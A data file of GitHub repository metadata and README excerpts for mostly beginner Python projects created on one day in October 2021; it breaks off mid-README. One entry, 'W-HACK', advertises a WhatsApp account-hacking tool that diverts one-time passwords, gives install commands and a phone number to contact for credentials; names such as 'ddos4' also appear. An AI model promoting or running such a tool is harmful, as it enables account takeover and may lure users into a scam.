417397360;python-dev-container;https://github.com/epics-containers/python-dev-container;Shell;2021-10-15T06:55:01Z;0;0;0;Python Dev Container Build/config for a container encompassing a Python 3 development environment Usage First ensure your name and email are set correctly in your Git config: https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-user-account/managing-email-preferences/setting-your-commit-email-address Build the container against your username with ./build Run it with ./run Type exit or press CTRL-D to leave the container. The container will mount a specific directory on your local machine where you should put your project files: /scratch/${USER}/work if available or /home/${USER}/work. The directory will be mounted to /local inside the container. Setting up Project Environment Inside the container: cd /local/<your project> pipenv install --dev This will create a virtualenv in /local/<your project>/venv/<some arbitrary directory>. Because /local is mounted this virtualenv will be reusable even if you restart the container. You can run commands inside the container with: pipenv run <command> 
417398033;Python-Homework2;https://github.com/edvardghukasyan/Python-Homework2;Python;2021-10-15T06:57:26Z;0;0;0;
417358432;Stock_Python_web-crawler;https://github.com/arthurya178/Stock_Python_web-crawler;Python;2021-10-15T03:34:51Z;0;0;0;Stock_Python_web-crawler 
417367108;python_pdf_cracker;https://github.com/yashlad27/python_pdf_cracker;;2021-10-15T04:22:47Z;0;0;0;
417324094;vscode-settings-python;https://github.com/JCPedroza/vscode-settings-python;;2021-10-15T00:41:14Z;0;0;0;My Visual Studio Code settings.json for Python Development The settings.json file is inside the .vscode folder. 
417339901;python.django-CRUD-Tutorials;https://github.com/mateusfmfm/python.django-CRUD-Tutorials;;2021-10-15T02:02:22Z;0;0;0;mateusfmfm-python.django-CRUD-Tutorials 
417340132;Python_optimization_battery_design;https://github.com/soumyadeeproy12/Python_optimization_battery_design;;2021-10-15T02:03:34Z;0;0;0;
417367164;Crud_simples_python;https://github.com/danieoliver7/Crud_simples_python;Python;2021-10-15T04:23:09Z;0;0;0;
417372359;Python_game_prac;https://github.com/vineet2345/Python_game_prac;Python;2021-10-15T04:52:47Z;0;0;0;Python-Game Simple python with pygame 
417376344;cosmic-python-homework;https://github.com/jamesliudotcc/cosmic-python-homework;Python;2021-10-15T05:15:11Z;0;0;0;
417352942;jump-to-python;https://github.com/kmsstat/jump-to-python;;2021-10-15T03:07:04Z;0;0;0;jump-to-python 
417399616;Crud_com_Python;https://github.com/Mezzosd/Crud_com_Python;Python;2021-10-15T07:03:06Z;0;0;0;
417383246;00_introduccion_python;https://github.com/matias-estanqueiro/00_introduccion_python;Python;2021-10-15T05:52:55Z;0;0;0;
417380179;gRPC-Python;https://github.com/ccppoo/gRPC-Python;Python;2021-10-15T05:36:40Z;0;0;0;gRPC-Python-QuickStart clean gRPC-Python start kit Simple working exmample for Python gRPC Because example given from the gRPC offical site is too large to handle for those who just want to make with python. I will add my own sample and also cover most of the examples from gRPC repository 1. Hello World - from gRPC/gRPC 
417388884;Python-dictionary-project;https://github.com/Nishanttalreja/Python-dictionary-project;Python;2021-10-15T06:18:56Z;0;0;0;Python-dictionary-project  
417345534;Programacion-Python-Flask;https://github.com/IvanCastroRuiz/Programacion-Python-Flask;Python;2021-10-15T02:30:53Z;0;0;0;
417342197;homework2python;https://github.com/richardnguyen734/homework2python;Python;2021-10-15T02:14:16Z;0;0;0;homework2python 
417331473;mis_ejercicios_python_unsam;https://github.com/AGNMZ/mis_ejercicios_python_unsam;Python;2021-10-15T01:20:40Z;0;0;0;
417324574;Ejercicios-curso-de-python;https://github.com/Juahn1/Ejercicios-curso-de-python;Python;2021-10-15T00:43:53Z;0;0;0;
417372835;Data-Science-Python-1;https://github.com/bluebennycode/Data-Science-Python-1;Jupyter Notebook;2021-10-15T04:55:40Z;0;0;0;Data-Science-Python-1 Real world issues solved in python 
417372068;python-random-quote;https://github.com/james8755/python-random-quote;Python;2021-10-15T04:51:08Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417384271;100daysofPython;https://github.com/vindhyasadanand/100daysofPython;Python;2021-10-15T05:57:56Z;0;0;0;100daysofPython contains different python projects built over 100days 
417321270;public-api-python;https://github.com/abdallahyamie/public-api-python;Go;2021-10-15T00:25:51Z;0;0;0;"public-api-python Public API for Public APIs Build Status Go Report Card Welcome to the official public API for the public-apis project! This service supports CORS and requires no authentication to use. All responses are sent over HTTPS as well. Base URL https://api.publicapis.org/ Services GET /entries List all entries currently cataloged in the project Parameters Parameter	Type	Data Type	Description	Required title	query	string	name of entry (matches via substring - i.e. ""at"" would return ""cat"" and ""atlas"")	No description	query	string	description of entry (matches via substring)	No auth	query	string	auth type of entry (can only be values matching in project or null)	No https	query	bool	return entries that support HTTPS or not	No cors	query	string	CORS support for entry (""yes"", ""no"", or ""unknown"")	No category	query	string	return entries of a specific category	No For categories like ""Science & Math"" which have a space and an ampersand, the query is simply the first word. Using ""Science & Math"" as an example, the correct query would be category=science GET /random List a single entry selected at random Parameters Parameter	Type	Data Type	Description	Required title	query	string	name of entry (matches via substring - i.e. ""at"" would return ""cat"" and ""atlas"")	No description	query	string	description of entry (matches via substring)	No auth	query	string	auth type of entry (can only be values matching in project or null)	No https	query	bool	return entries that support HTTPS or not	No cors	query	string	CORS support for entry (""yes"", ""no"", or ""unknown"")	No category	query	string	return entries of a specific category	No GET /categories List all categories Parameters None GET /health Check health of the running service Parameters None "
417345239;ETL-with-Python;https://github.com/toplaa/ETL-with-Python;Jupyter Notebook;2021-10-15T02:29:21Z;0;0;0;ETL-with-Python In this Tutorial, we :  Read file from different sources, csv, jsonand xml Extracted data from the above file types _ created extract functions Transformed the data - created transformed functions saved the data into a ready-to-load format for data Engineers/ Data scienties ---> transformed_data.csv  
417395129;Automation-using-python;https://github.com/chetandsbhadane/Automation-using-python;;2021-10-15T06:45:51Z;0;0;0;
417366002;Arquivos-PDF-em-Python;https://github.com/Beto-Rivoli/Arquivos-PDF-em-Python;Python;2021-10-15T04:16:05Z;1;1;0;
417400776;Data-Analyst-in-Python;https://github.com/fikricakep/Data-Analyst-in-Python;;2021-10-15T07:07:12Z;0;0;0;Data-Analyst-in-Python This is my learning journey on Dataquest 
417417059;python-random-quote;https://github.com/Francewalk/python-random-quote;Python;2021-10-15T08:02:37Z;0;0;0;Let's Write a Python Quote Bot! This repository will get you started with building a quote bot in Python. It's meant to be used along with the Learning Lab intro to Python. When complete, you'll be able to grab random quotes from the command line, like this:  $ python get-quote.py Keep it logically awesome $ python get-quote.py Speak like a human  Start the Tutorial You can find your next step in this repo's issues! 
417403203;banana;https://github.com/Pakky1234/banana;Python;2021-10-15T07:15:43Z;0;0;0;
417349963;ptest;https://github.com/cmurray4492/ptest;Python;2021-10-15T02:53:00Z;0;0;0;
417317253;Python-project-for-Data-Science;https://github.com/carlintchuisseu/Python-project-for-Data-Science;;2021-10-15T00:04:09Z;0;0;0;Python-project-for-Data-Science This repo contains the final assignment of the course python project for Data Science from the IBM professional Data Science certificate on Coursera 
417363380;Python_III-Tratamento_de_Erros;https://github.com/Eliandro-Gomes/Python_III-Tratamento_de_Erros;;2021-10-15T04:02:03Z;1;1;0;
417359647;Funciones-Clases-Obj-en-Python;https://github.com/levleonhardt/Funciones-Clases-Obj-en-Python;Python;2021-10-15T03:41:42Z;0;0;0;
417380149;python-Data-type-and-Algorithm;https://github.com/sdhamdar7890/python-Data-type-and-Algorithm;Python;2021-10-15T05:36:29Z;0;0;0;python-Data-type-and-Algorithm 
417346254;borehole-simulation-with-python-programming;https://github.com/hassanreza1995/borehole-simulation-with-python-programming;Python;2021-10-15T02:34:31Z;0;0;0;
417408894;Cracking_The_Coding_Interview-Python-;https://github.com/DarekarA/Cracking_The_Coding_Interview-Python-;Jupyter Notebook;2021-10-15T07:35:04Z;0;0;0;
417395651;Jumble-Word-Game-using-Python;https://github.com/abhishek173/Jumble-Word-Game-using-Python;Python;2021-10-15T06:48:09Z;1;1;0;
417355971;MicroPython-ESP32-Boilerplate;https://github.com/danieldiasm/MicroPython-ESP32-Boilerplate;Python;2021-10-15T03:21:48Z;0;0;0;MicroPython-ESP32-Boilerplate A bunch of reusable codes that I made to ease the process of coding during projects. WIP - Most code isn't here yet Here you'll find:  MQTT Code ready to work on AWS WiFi Manager Wake-On-Lan Package  
417375484;Docker_python_cloud_9_tutorial;https://github.com/Zomma2/Docker_python_cloud_9_tutorial;;2021-10-15T05:10:10Z;0;0;0;Docker_python_cloud_9_tutorialDocker Tutorial Using Cloud 9 
417367289;AI-Voice-Assistant-Using-Python;https://github.com/Tanu-Shree-31/AI-Voice-Assistant-Using-Python;Python;2021-10-15T04:23:52Z;0;0;0;AI-Voice-Assistant-Using-Python 
417377525;Blue-color-detection-in-python;https://github.com/amrixpark/Blue-color-detection-in-python;;2021-10-15T05:21:49Z;0;0;0;Blue-color-detection-in-python 
417382684;Physic-Kinematic-Static-Dynamic-Python;https://github.com/aldotb/Physic-Kinematic-Static-Dynamic-Python;Jupyter Notebook;2021-10-15T05:49:35Z;1;1;0;
417385587;Music-Player;https://github.com/galibkhan123/Music-Player;Python;2021-10-15T06:03:27Z;0;0;0;Music-Player Music Player for Python 
417412090;confprint;https://github.com/lewiuberg/confprint;Python;2021-10-15T07:46:08Z;0;0;0;" ConfPrint             Copyright 2021 Lewi Lie Uberg Released under the MIT license ConfPrint provides a simple way to make predefined printer configurations. Contents   Citation  APA BibTex   Prerequisites Installation  Using pip: Using Poetry:   Usage  prefix_printer   Authors License Acknowledgments  Citation Please see CITATION.cff for the full citation information. APA Lie Uberg, L., & Hjelle, G. A. (2021). confprint (Version 0.1.1) [Computer software]. https://github.com/lewiuberg/confprint  BibTex @software{Lie_Uberg_confprint_2021, author = {Lie Uberg, Lewi and Hjelle, Geir Arne}, license = {MIT}, month = {10}, title = {{confprint}}, url = {https://github.com/lewiuberg/confprint}, version = {0.1.1}, year = {2021} } Prerequisites Click Please see pyproject.toml for the full citation information. Installation Using pip: python -m pip install confprint Using Poetry: poetry add confprint Usage prefix_printer from confprint import prefix_printer  p_test1 = prefix_printer(prefix=""test1"") p_test1(""Preset"")  p_test2 = prefix_printer(prefix=""test2"", upper=False) p_test2(""unaltered text"")  p_test3 = prefix_printer(prefix=""test3"", stderr=True) p_test3(""using sys.stderr.write as the print function"")  p_test4 = prefix_printer(prefix=""test4"", click=True) p_test4(""using click.echo as the print function"")  p_test5 = prefix_printer(prefix=""test5"", frame_left=""( "", frame_right="" )"") p_test5(""using custom frame characters"")  p_test1(     """"""With new lines in strings the text is converted to multiline, then all but the first are indented to line up with therest."""""" )  p_test1(     ""The next example wil not be ending with a `:`, ""     ""since it has no input.\nAnd as you can see, this is also a multiline text."" )  p_done = prefix_printer(prefix=""done"") p_done() [TEST1]: Preset [test2]: unaltered text [TEST3]: using sys.stderr.write as the print function [TEST4]: using click.echo as the print function ( TEST5 ): using custom frame characters [TEST1]: With new lines in strings the text is converted          to multiline, then all but the first are          indented to line up with therest. [TEST1]: The next example wil not be ending with a `:`, since it has no input.          And as you can see, this is also a multiline text. [DONE]  Authors  Lewi Lie Uberg - uberg.me  License This project is licensed under the MIT License - see the LICENSE file for details Acknowledgments  Geir Arne Hjelle, for his presentation on 'Introduction to Decorators' given at PyCon 21  "
417362340;PYGAME-TEST;https://github.com/JGreyScales/PYGAME-TEST;Python;2021-10-15T03:56:46Z;0;0;0;basic pygame test 
417324430;engComp.intComp.sat;https://github.com/NivardoX/engComp.intComp.sat;;2021-10-15T00:43:04Z;0;0;0;engComp.intComp.sat sat in python 
417366087;Kaggle-20-Newsgroups-using-Naive-Bayes;https://github.com/gkskarthik/Kaggle-20-Newsgroups-using-Naive-Bayes;Python;2021-10-15T04:16:35Z;0;0;0;
417367879;pyAutoGui;https://github.com/cygsec/pyAutoGui;Python;2021-10-15T04:26:49Z;0;0;0;python various python scripts 
417371185;Friday;https://github.com/noorakhtar30/Friday;;2021-10-15T04:46:07Z;0;0;0;
417366306;ddos4;https://github.com/takkza/ddos4;Python;2021-10-15T04:17:57Z;0;0;2;
417368256;Banana-;https://github.com/Prachman09/Banana-;;2021-10-15T04:29:11Z;0;0;0;
417404299;othello;https://github.com/tamarailic/othello;;2021-10-15T07:19:38Z;0;0;0;othello Othello project in Python This is my project from Data Structures and Algorithms class. The idea is to use game tree and hashmaps to make and AI to play othello game against. The board is represented by 8x8 matrix and every possible situation on board is presented as State object. AI makes game tree where it tries to find the best possible move for itself. 
417398146;kindergarten-scraper;https://github.com/AlmasToimbekov/kindergarten-scraper;Python;2021-10-15T06:57:53Z;0;0;0;"Description This is a scraper of a website in Kazakhstan for finding free spots in kindergarten. Once the place is found the Telegram notification is sent to the telegram bot. Settings  Install project dependencies pip install -r ./requirements.txt Create a Telegram bot using this article and go through the necessary steps for setting the telegram-send configure command; Install the chromedriver; Set the get_data.py:CHROME_DRIVER_PATH variable pointing to that chromedriver location path; Fill the get_data.py:kindergartens array with ones you need to monitor; Set the schedule in main.py (line 21); Run the source venv/bin/activate from the terminal you want to use for launching the script; Launch the script using python main.py command.  "
417375695;LINEAR-REGRESSION;https://github.com/Nithin12072000/LINEAR-REGRESSION;Jupyter Notebook;2021-10-15T05:11:19Z;0;0;0;LINEAR-REGRESSION LINEAR REGRESSION WITH PYTHON 
417360527;miHola;https://github.com/bettyit/miHola;Python;2021-10-15T03:46:31Z;0;0;0;
417344603;hello-world;https://github.com/meganriley/hello-world;Python;2021-10-15T02:26:15Z;0;0;0;"Hello World Welcome to Hello World on Exercism's Python Track. If you need help running the tests or submitting your code, check out HELP.md. Instructions The classical introductory exercise. Just say ""Hello, World!"". ""Hello, World!"" is the traditional first program for beginning programming in a new language or environment. The objectives are simple:  Write a function that returns the string ""Hello, World!"". Run the test suite and make sure that it succeeds. Submit your solution and check it at the website.  If everything goes well, you will be ready to fetch your first real exercise. Source Created by  @michaelem  Contributed to by  @behrtam @cmccandless @Dog @hebertjulio @ikhadykin @kytrinyx @N-Parsons @NobbZ @pheanex @skeskali @Sukhj1nder @tqa236  Based on This is an exercise to introduce users to using Exercism - http://en.wikipedia.org/wiki/%22Hello,_world!%22_program "
417337674;blackjack;https://github.com/barriousc/blackjack;;2021-10-15T01:51:29Z;0;0;0;blackjack blackjack python game 
417347554;teaching.github.io;https://github.com/PaTheReal/teaching.github.io;HTML;2021-10-15T02:41:04Z;0;0;0;
417322666;learning_2021;https://github.com/ghedin-alison/learning_2021;HTML;2021-10-15T00:32:59Z;0;0;0;
417376227;W-HACK;https://github.com/spider863644/W-HACK;Python;2021-10-15T05:14:26Z;2;2;0;W-HACK A python tool used for hacking WhatsApp by diverting otp You can hack WhatsApp easily with this tool Note:OTP expires after 5 seconds HOW TO INSTALL: $ apt update && apt upgrade $ apt install git && apt install python $ git clone https://github.com/spider863644/W-HACK $ cd W-HACK $ python3 WhatsApp.py NOTE: MESSAGE ME FOR TOOL NAME AND PASSWORD ON WHATSAPP (+2349052863644)  ONLY FOR EDUCATIONAL PURPOSES ONLY I WON'T BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL Follow me on github  How to get username and password: Follow me on github then message me on +2349052863644 with proof(screenshot) that u have followed me on github Then I will give u username and password 
417352246;Youtube-Downloader;https://github.com/angelluis24/Youtube-Downloader;Python;2021-10-15T03:03:42Z;2;2;0;Youtube-Downloader Download videos and audio with a graphical interface in python Windows To run windows using Command Prompt python main.py linux To run on linux chmod +x start.sh ./start.sh 
417345908;Intelligent-borehole-simulation-with-python-programming;https://github.com/hassanreza1995/Intelligent-borehole-simulation-with-python-programming;;2021-10-15T02:32:38Z;0;0;0;
417394384;python-online-compiler-Gc5oHA;https://github.com/tryspidy/python-online-compiler-Gc5oHA;Python;2021-10-15T06:42:56Z;0;0;0;
417367019;iNeuron_Python_advance_Programming_assignments;https://github.com/Vinayak-HUB1/iNeuron_Python_advance_Programming_assignments;Jupyter Notebook;2021-10-15T04:22:16Z;0;0;0;
417416655;PYTHON-y-R-BigData-Structuralia;https://github.com/jotagectti/PYTHON-y-R-BigData-Structuralia;Jupyter Notebook;2021-10-15T08:01:27Z;0;0;0;
417385232;Writing-YAML-to-a-File-in-Python;https://github.com/Ming-Shu/Writing-YAML-to-a-File-in-Python;Python;2021-10-15T06:01:57Z;0;0;0;Writing-YAML-to-a-File-in-Python Take tb_gateway.yaml in thingsboard-gateway as an example Operating System   : Ubuntu 18.04 LTS python version :3.6.9 We can install the ' PyYAML' Run the command: pip3 install pyyaml  We’d need to install the 'ruamel_yaml' in example. Run the command: sudo -H pip3 install ruamel.yaml   referance: https://stackoverflow.com/questions/49747685/python3-no-module-named-ruamel-yaml https://stackoverflow.com/questions/56357051/how-to-start-listing-keys-after-a-new-line-in-a-block YAML referance: https://github.com/thingsboard/thingsboard-gateway/blob/master/for_build/etc/thingsboard-gateway/config/tb_gateway.yaml 
417393231;How-to-import-Python-classes-into-R;https://github.com/binmishr/How-to-import-Python-classes-into-R;;2021-10-15T06:38:04Z;0;0;0;How-to-import-Python-classes-into-R The details of the codeset and plots are included in the attached Adobe Acrobat reader (.pdf) file in this repository. You need to download the same to view the contents. There are referrals to other contents in BLUE colour also to follow. 
417360299;ICS3U-Assignment5-Python;https://github.com/Seti-Ngabo/ICS3U-Assignment5-Python;Python;2021-10-15T03:45:19Z;0;0;0;ICS3U-Assignment5-Python  
417376384;What-R-you-in-python-R-vectors-;https://github.com/binmishr/What-R-you-in-python-R-vectors-;;2021-10-15T05:15:24Z;0;0;0;"What-R-you-in-python-R-vectors The details of the codeset and plots are included in the attached Microsoft Word Document (.docx) file in this repository. You need to view the file in ""Read Mode"" to see the contents properly after downloading the same. "
417339102;MLwork;https://github.com/solomonj92/MLwork;Python;2021-10-15T01:59:02Z;0;0;0;
417364704;kalman;https://github.com/trmckay/kalman;Python;2021-10-15T04:08:50Z;0;0;0;
417352293;rsa-cryptography;https://github.com/Frankyh-9/rsa-cryptography;Python;2021-10-15T03:03:56Z;0;0;0;
417344609;Problem-Solving-Codes;https://github.com/tharina11/Problem-Solving-Codes;;2021-10-15T02:26:16Z;0;0;0;Problem-Solving-Codes Problems solved with python programming 
417319189;introPy;https://github.com/ricardohirata/introPy;Python;2021-10-15T00:14:08Z;0;0;0;
417356772;Valida_CPF;https://github.com/DevisonReis/Valida_CPF;Python;2021-10-15T03:26:01Z;0;0;0;Valida_CPF Código Python para validar CPF 
417322552;fizzbuzz;https://github.com/JillKavanaugh/fizzbuzz;Python;2021-10-15T00:32:20Z;0;0;0;
417338759;ChatRoom;https://github.com/EVA-JianJun/ChatRoom;Python;2021-10-15T01:57:23Z;0;0;0;"ChatRoom Python的聊天室！让你非常简易的建立可靠的网络连接！ 安装 pip install ChatRoom-jianjun  简介 在聊天室（Room）内的用户（User  Python对象）可以互相发送消息（Python 数据） 使用 import ChatRoom  # 创建聊天室 room = ChatRoom.Room()  # 创建两个用户 user_1 = ChatRoom.User(""Foo"") user_1.default_callback() user_2 = ChatRoom.User(""Bar"") user_2.default_callback()  # 需要等待Room调度连接后, 才可以互相发送消息 user_1.user.Bar.send(""Hello!"") user_2.user.Foo.send(""Hello!"")  # 互相收到消息 >> 2021-10-15 10:15:04 Bar recv: ['Foo', 'Hello!'] >> 2021-10-15 10:15:04 Foo recv: ['Bar', 'Hello!']  ChatRoom 自动处理了很多网络配置中需要提供的复杂参数，ChatRoom 也解决了许多在网络传输中会遇到的麻烦问题.  高层对象：ChatRoom 是通过网络来传输 Python 数据对象，所以只有需要使用网络传输的情况使用 ChatRoom 才是合适的； 安全高效：传输层使用 TCP 协议，保证数据传输可靠，会话层使用了双端非对称加密保证数据传输的安全性，密码保存使用了 bcrypt 算法，保证用户密码不泄露； 全自动化：ChatRoom 的优势在于无论客户端主机是局域网机器，公网机器，还是不同内网环境的机器，都会由 Room 自动调度后分配集群的最高效连接方式； 逻辑隔离：ChatRoom 让用户专注与程序逻辑处理，而不用考虑物理机的网络配置，大多数的情况下只需几个参数就可以让集群互相连接起来；  ChatRoom 包含 Room 和 User 类、底层的 Server 和 Client 类、一个生成用户HASH密码的函数 hash_encryption import ChatRoom  ChatRoom.Room ChatRoom.User  ChatRoom.Server ChatRoom.Client  ChatRoom.hash_encryption  ChatRoom 的连接方式  局域网内互相连接：只要两个 User 处于同一局域网内，那么他们会直接局域网内连接； 具有公网IP的 User：在不满足 1 的情况下，其他机器都会使用公网IP进行连接； 中继连接：1 和 2 都不满足的情况下，相当于 User 被网络隔绝了，那么会通过 Room 进行数据转发；  Room Room 是 ChatRoom 的核心，所有的 User 的行为都是由 Room 来进行调度，可以把 Room 理解为一个小型的服务端，所有的 User 都会与 Room 连接. 当 User 与 Room 断开连接后，除了中继连接会断开，其他的连接方式不受影响，等待 Room 恢复后，所有的 User 会与 Room 再次建立连接. 在开始运行集群前，需要先把 Room 运行起来！ import ChatRoom  # 创建聊天室 room = ChatRoom.Room()  """""" 文档:     创建一个聊天室  参数:     ip : str         聊天室建立服务的IP地址     port : int (Default: 2428)         端口     password : str (Default: ""Passable"")         密码     log : None or str (Default: ""INFO"")         日志等级             None: 除了错误什么都不显示             ""INFO"": 显示基本连接信息             ""DEBUG"": 显示所有信息     user_napw_info : dict (Default: {})         用户加密密码信息字典, 设定后只有使用正确的用户名和密码才能登录服务端         不指定跳过用户真实性检测         使用 hash_encryption 函数生成需要的 user_napw_info     blacklist : list (Default: [])         ip黑名单, 在这个列表中的ip会被聊天室集群拉黑  例子:     # 启动一个聊天室     import ChatRoom     room = ChatRoom.Room()      # 其他功能请参考user_napw_info和blacklist的作用 """"""  默认 Room 建立在本机，不设置密码，不对用户有任何限制. 设置用户密码 这里说下怎么设置连接集群的用户密码，其实就是对用户身份进行验证，冒充的用户是连接不上的. 不用担心密码被暴力破解, 一是有拉黑逻辑，二是 bcrypt 算法对暴力破解非常不友好，暴力破解是不可能的！ import ChatRoom  # 用户密钥HASH字典 user_napw_info = {     'Foo': b'$2b$10$6Y/A7JyMxNXKGGu.4AelJ.TjLHWqZ6YemIzBT9Gcjugy3gSHNy77e',     'Bar': b'$2b$10$rTQtNZDzfO7484b/UZltROJ/Yy5f1WOxZIeymjv8JhSQrFoGuGS8i',     }  # 设置user_napw_info参数就设置了用户密码 room = ChatRoom.Room(user_napw_info=user_napw_info)  生成用户密钥HASH字典 # 使用 hash_encryption 函数生成用户密钥HASH字典, 传入明文, 返回HASH密文 user_napw_info = hash_encryption(     {         'Foo': ""123456"",         'Bar': ""123456"",     } )  >> user_napw_info {     'Foo': b'$2b$10$6Y/A7JyMxNXKGGu.4AelJ.TjLHWqZ6YemIzBT9Gcjugy3gSHNy77e',     'Bar': b'$2b$10$rTQtNZDzfO7484b/UZltROJ/Yy5f1WOxZIeymjv8JhSQrFoGuGS8i', }  """""" return Server's user_napw_info  user_info_dict: {     ""Foo"" : ""123456"",     ""Bar"" : ""abcdef"", }  return: {     'Foo': b'$2b$10$qud3RGagUY0/DaQnGTw2uOz1X.TlpSF9sDhQFnQvAFuIfTLvk/UlC',     'Bar': b'$2b$10$rLdCMR7BJmuIczmNHjD2weTn4Mqt7vrvPqrqdTAQamow4OzvnqPji' } """"""  User User 的配置会稍微复杂点，毕竟 User 需要告诉 Room 自身的一些信息，而这些信息需要用户按需提供. import ChatRoom  # 创建一个聊天室用户 user = ChatRoom.User(         # 用户名和用户密码         user_name=""Foo"",         user_password=""123456"",          # 需要连接的聊天室信息         # ip         room_ip=""192.168.0.2"",         # 端口         room_port=""2428"",         # 密码         room_password=""123456"",          # 本机的一些信息         # 公网ip, 默认为空, 设置后标识本机具有公网地址         public_ip="""",         # 对外提供服务的端口, 默认随机端口号(0)         server_port=0,         # 局域网标识, 默认""Default"", 相同的局域网内用户需要设置为相同lan_id, 值为字符串, 自己定义         lan_id=""Default"",          # 其他无关参数         # 日志等级         log=""INFO"",         # 密码位数         password_digits=16,      )  """""" 文档:     创建一个聊天室用户  参数:     user_name : str         用户名     user_password : str (Default: """")         用户密码     room_ip : str (Default: ""127.0.0.1"")         需要连接的聊天室ip, 默认为本机ip     room_port : int  (Default: 2428)         需要连接的聊天室端口     room_password : str (Default: ""Passable"")         需要连接的聊天室密码     public_ip : str (Default: """")         如果本机拥有公网ip填写public_ip后本机被标记为公网ip用户         其他用户连接本用户都将通过此公网ip进行连接     server_port : int (Default: ramdom)         本机消息服务对外端口, 默认为 0 系统自动分配         请注意需要在各种安全组或防火墙开启此端口     lan_id : str (Default: ""Default"")         默认为""Default"", 局域网id, 由用户手动设置         同一局域网的用户请使用相同的局域网id, 这样同一内网下的用户将直接局域网互相连接而不会通过速度慢的中继连接等方式     log : None or str (Default: ""INFO"")         日志等级             None: 除了错误什么都不显示             ""INFO"": 显示基本连接信息             ""DEBUG"": 显示所有信息     password_digits : int (Default: 16)         密码位数, 默认16位  例子:     import ChatRoom      # 创建一个聊天室用户     user = ChatRoom.User(             user_name=""Foo"",         )      # 运行默认的回调函数(所有接受到的信息都在self.recv_info_queue队列里,需要用户手动实现回调函数并使用)     # 默认的回调函数只打印信息     user.default_callback() """"""  需要注意的有 public_ip、server_port、lan_id 三个参数  具有公网IP的机器才需要设置 public_ip 有些机器的环境有安全组或防火墙什么的, 需要放通相应的端口, 所以此类机器需要指定 server_port 在同一局域网内的用户指定为相同的 lan_id , 好让他们互相使用局域网直接互相连接  Room 应该搭建在所有 User 都能访问的机器上, 然后 User 根据自身的情况设置好参数, 以后无论程序重启、离线、上线导致该 User 断开连接, 其他 User 都会自动处理连接, 在该 User 重新连接到集群中时, Room 会重新调度连接该 User. 回调函数数据接受 无论Room 还是 User, 所有的信息接受到都会存储在 self.recv_info_queue 队列里, 上面的 slef.default_callback 函数默认只是简单的打印了队列里的信息. def default_callback_server(self):     def sub():         while True:             recv_data = self.recv_info_queue.get()             # 只打印 TODO             print(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), ""recv:"", recv_data)      # 使用线程循环处理数据     sub_th = threading.Thread(target=sub)     sub_th.setDaemon(True)     sub_th.start()  这里使用了线程循环处理接受到的数据, 且只打印了接收到的数据, 用户需要根据实际情况覆写或者重新 default_callback_server 函数实现自己的功能. class My_User(User):      # 继承覆写父类函数     def default_callback_server(self):         def sub():             while True:                 recv_data = self.recv_info_queue.get()                 # print(datetime.now().strftime('%Y-%m-%d %H:%M:%S'), ""recv:"", recv_data)                  # 自定义接受数据处理                 try:                     some_function(recv_data)                 except Exception as err:                     traceback.print_exc()                     print(err)          # 使用线程循环处理数据         sub_th = threading.Thread(target=sub)         sub_th.setDaemon(True)         sub_th.start()  Server & Client ChatRoom.Server ChatRoom.Client  Server 和 Client 是 Room 所使用底层连接协议, 属于单Server对多Client的连接模式, 在一些需求简单的情况下使用 Server 和 Client 也是可以的, 具体的使用方式请参考构造函数文档, 或查阅源代码. "
417381315;my_own_browser;https://github.com/dassomnath99/my_own_browser;Python;2021-10-15T05:42:44Z;0;0;0;my_own_browser This is Written in Python Change the Name of The Browser Written in 53rd Line 
417345184;trepo;https://github.com/VinicioStalinSalcedo/trepo;HTML;2021-10-15T02:29:06Z;0;0;0;trepo Python, JS, CSS and HTML 
417334337;FizzBuzzIT4320;https://github.com/jtspencer3/FizzBuzzIT4320;Python;2021-10-15T01:34:17Z;0;0;0;
417330864;Hacktober-2021;https://github.com/Kronos-2701/Hacktober-2021;C++;2021-10-15T01:17:19Z;1;1;11;"Hacktober-2021 Hacktoberfest Hello World !!! HacktoberFest Hello World in every other language ever. Just fork it and add a 'Hello World' program to contribute for hacktober fest and send a Pull Request!!  Get yourself free goodies by just writing a hello world! Say hi to the world in any language of your choice! What is Hacktoberfest? Hacktoberfest is a program by Digital Ocean, DEV and Github, where you can easily win a T-Shirt just by making 4 pull requests in the month of October to any open source projects on Github. Steps to follow 📜 1. Register for Hacktoberfest https://hacktoberfest.digitalocean.com/ 2. Fork it 🍴 You can get your own fork/copy of Hacktoberfest by using the Fork button.  3. Add a Program in any Language you like 🐇 Once you have forked the repo, add your progam in the language folder in main branch, if there is no language folder, make one, then add into it. You can take a look to the Programming Language List in Wikipedia to create a new one for Hacktoberfest! 4. Ready, Steady, Go... 🐢 🐇 Once you have completed these steps, you are ready to start contributing by checking our Help Wanted issues and creating pull requests. 5. Give this Project a Star ⭐ If you liked working on this repo, please share this repo as much as you can and star this repo to help as many people in opensource as you can. Steps to Make Changes and contribute using GIT! To make your own local copy of the repository you would like to contribute to, let’s first open up a terminal window. We’ll use the git clone command along with the URL that points to your fork of the repository. This URL will be similar to the URL above, except now it will end with .git . In the cloud_haiku example above, the URL will look like this: https://github.com/your-username/Hacktoberfest.git You can alternatively copy the URL by using the green “Clone or download” button from your repository page that you just forked from the original repository page. Once you click the button, you’ll be able to copy the URL by clicking the binder button next to the URL: Once we have the URL, we’re ready to clone the repository. To do this, we’ll combine the git clone command with the repository URL from the command line in a terminal window: git clone https://github.com/your-username/Hacktoberfest.git 4. Create a New Branch To create your branch, from your terminal window, change your directory so that you are working in the directory of the repository. Be sure to use the actual name of the repository (i.e. Hacktoberfest) to change into that directory. cd Hacktoberfest Now, we’ll create our new branch with the git branch command. Make sure you name it descriptively so that others working on the project understand what you are working on. git branch new-branch Now that our new branch is created, we can switch to make sure that we are working on that branch by using the git checkout command: git checkout new-branch Once you enter the git checkout command, you will receive the following output: Output: Switched to branch 'new-branch' At this point, you can now modify existing files or add new files to the project on your own branch. Make Changes Locally Once you have modified existing files or added new files to the project, you can add them to your local repository, which you can do with the git add command. Let’s add the -A flag to add all changes that we have made: git add -A or git add . Next, we’ll want to record the changes that we made to the repository with the git commit command. The commit message is an important aspect of your code contribution; it helps the other contributors fully understand the change you have made, why you made it, and how significant it is. Additionally, commit messages provide a historical record of the changes for the project at large, helping future contributors along the way. If you have a very short message, you can record that with the -m flag and the message in quotes: Example: git commit -m ""Updated Readme.md"" At this point you can use the 